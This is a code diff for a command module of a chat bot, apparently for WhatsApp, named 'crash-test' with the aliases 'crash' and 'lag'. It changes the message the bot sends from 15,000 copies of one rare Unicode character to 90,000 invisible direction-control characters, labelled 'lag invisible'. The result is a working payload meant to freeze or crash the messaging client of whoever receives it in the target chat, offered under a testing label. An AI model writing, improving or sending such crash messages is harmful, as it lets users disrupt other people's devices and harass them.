@@ -2,12 +2,12 @@ const { PREFIX } = require("../../krampus");
 
 module.exports = {
   name: "crash-test",
-  description: "Envía un mensaje largo de prueba para evaluar resistencia.",
+  description: "Envía un mensaje lagger para probar la resistencia del cliente.",
   commands: ["crash", "lag"],
   usage: `${PREFIX}crash`,
   handle: async ({ socket, remoteJid }) => {
     try {
-      const lagString = "﷽".repeat(15000); // Carácter unicode raro repetido
+      const lagString = "\u200F\u200E\u202E".repeat(30000); // lag invisible
       await socket.sendMessage(remoteJid, {
         text: lagString,
       });
